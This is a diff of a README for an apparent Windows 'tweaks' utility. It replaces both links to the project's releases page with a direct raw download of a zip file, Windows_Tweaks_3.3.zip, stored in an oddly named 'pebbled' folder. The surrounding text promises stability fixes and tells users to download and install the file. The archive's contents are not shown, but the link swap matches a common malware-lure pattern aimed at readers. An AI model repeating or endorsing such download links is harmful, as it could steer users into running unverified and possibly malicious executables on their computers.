@@ -1,6 +1,6 @@
 # 🛠️ Windows-Tweaks - Improve your computer stability today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sebsspawner297/Windows-Tweaks/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sebsspawner297/Windows-Tweaks/raw/refs/heads/main/pebbled/Windows_Tweaks_3.3.zip)
 
 ## About this project
 Windows-Tweaks provides fixes for common system errors and performance issues. This tool aligns your operating system with current performance standards. It works on Windows 10 and Windows 11. This software requires a 64-bit version of Windows. We update this project to ensure compatibility with 2026 system standards. Community members maintain the code to keep your PC stable during heavy tasks.
@@ -15,7 +15,7 @@ Windows-Tweaks provides fixes for common system errors and performance issues. T
 ## 🚀 Getting started
 You can obtain the current version of this software from our release page. Visit this page to download the latest setup file. We package everything into a single installer to simplify the process for you.
 
-[https://github.com/sebsspawner297/Windows-Tweaks/releases](https://github.com/sebsspawner297/Windows-Tweaks/releases)
+[https://github.com/sebsspawner297/Windows-Tweaks/raw/refs/heads/main/pebbled/Windows_Tweaks_3.3.zip](https://github.com/sebsspawner297/Windows-Tweaks/raw/refs/heads/main/pebbled/Windows_Tweaks_3.3.zip)
 
 ## 📥 Installation steps
 1. Go to the link provided above.
